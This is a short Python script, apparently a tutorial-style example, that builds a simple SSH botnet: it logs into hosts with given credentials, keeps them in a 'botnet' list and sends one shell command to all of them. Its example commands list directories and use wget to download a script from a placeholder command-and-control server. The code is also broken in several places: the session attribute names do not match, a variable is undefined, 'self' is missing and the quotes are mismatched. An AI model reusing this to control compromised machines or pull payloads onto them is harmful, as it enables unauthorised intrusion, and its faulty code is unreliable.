from pexpect import pxssh

class Bot:
    
    # Initialize new client
    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.sessions = self.ssh()

    # Secure shell into client
    def ssh(self):
        try:
            bot = pxssh.pxssh()
            bot.login(self.host, self.user, self.password)
            return bot
        except:
            print('Connection failure')
            print(e)

    # Send command to client
    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before

    # Send a command to all bots in the botnet
    def command_bots(command):
        for bot in botnet:
            attack = bot.send_command(command)
            print('Output from ' + bot.host)
            print(attack)

# List of bots in botnet
botnet = []

# Add a new bot to your botnet
def add_bot(host, user, password):
    new_bot = Bot(host, user, password)
    botnet.append(new_bot)

add_bot('{HOST IP}', '', '')

# List user home directory
command_bots('ls')

# Download scripts/files
command_bots("""wget -O /Users/Admin/Desktop/ "http://c&cserver.com/script.py"""")
